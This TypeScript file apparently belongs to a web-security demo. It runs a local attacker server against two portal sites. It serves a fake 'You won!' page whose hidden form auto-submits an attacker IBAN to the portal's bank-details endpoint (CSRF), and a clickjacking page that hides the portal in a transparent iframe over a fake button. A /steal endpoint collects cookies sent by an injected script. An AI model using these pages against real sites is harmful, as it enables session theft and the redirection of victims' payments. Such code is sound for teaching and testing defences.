// The attacker's site on :53252, a different origin from both portals.
//   GET /csrf?target=<portal origin>   a "prize" page whose hidden form POSTs new bank details to the portal on load
//   GET /frame?target=<portal origin>  a "prize" page that loads the portal in a transparent iframe over a fake button (clickjacking)
//   GET /steal?c=<cookies>             where the injected script sends document.cookie
//   GET /__stolen                      what was stolen (for the demo's checks)
import http from "node:http";

export const ATTACKER_PORT = 53252;
export const ATTACKER_IBAN = "XX00 ATTACKER 0000 0000";

export function createAttacker() {
  const stolen: { at: string; cookie: string; from: string }[] = [];
  const server = http.createServer((req, res) => {
    const url = new URL(req.url ?? "/", `http://localhost:${ATTACKER_PORT}`);
    const target = url.searchParams.get("target") ?? "";
    const html = (body: string) => {
      res.writeHead(200, { "content-type": "text/html; charset=utf-8" });
      res.end(`<!doctype html><html lang="en"><head><meta charset="utf-8"><title>You won!</title><style>
body { margin: 0; font: 16px/1.5 system-ui, sans-serif; background: #fff8e1; color: #3a2a00; }
h1 { margin: 0; padding: 16px 24px; background: #eda100; color: #1d1400; }
.stage { position: relative; margin: 16px 24px; width: 800px; height: 520px; }
.bait { position: absolute; left: 0; top: 0; width: 800px; height: 520px; border: 2px dashed #b07800; box-sizing: border-box; padding: 16px; }
.bait button { position: absolute; left: 470px; top: 368px; font-size: 18px; padding: 8px 18px; }
iframe { position: absolute; left: 0; top: 0; width: 800px; height: 520px; border: 0; opacity: 0.55; }
</style></head><body>${body}</body></html>`);
    };
    if (url.pathname === "/csrf") {
      return html(`<h1>Congratulations! Claim your prize</h1><p style="padding:0 24px">Loading your prize...</p>
<form id="f" method="post" action="${target}/bank"><input type="hidden" name="iban" value="${ATTACKER_IBAN}"></form>
<script>document.getElementById('f').submit()</script>`);
    }
    if (url.pathname === "/frame") {
      return html(`<h1>Congratulations! Click the button to claim your prize</h1>
<div class="stage"><div class="bait"><p>Your prize is waiting.</p><button>Claim prize</button></div><iframe id="victim" src="${target}/"></iframe></div>`);
    }
    if (url.pathname === "/steal") {
      stolen.push({ at: new Date().toISOString(), cookie: url.searchParams.get("c") ?? "", from: req.headers.referer ?? "" });
      console.log(`   [attacker :${ATTACKER_PORT}] received document.cookie "${url.searchParams.get("c")}" from ${req.headers.referer ?? "?"}`);
      res.writeHead(204).end();
      return;
    }
    if (url.pathname === "/__stolen") {
      res.writeHead(200, { "content-type": "application/json" }).end(JSON.stringify(stolen));
      return;
    }
    res.writeHead(404).end();
  });
  return { server, stolen, listen: () => new Promise<void>((r) => server.listen(ATTACKER_PORT, r)) };
}
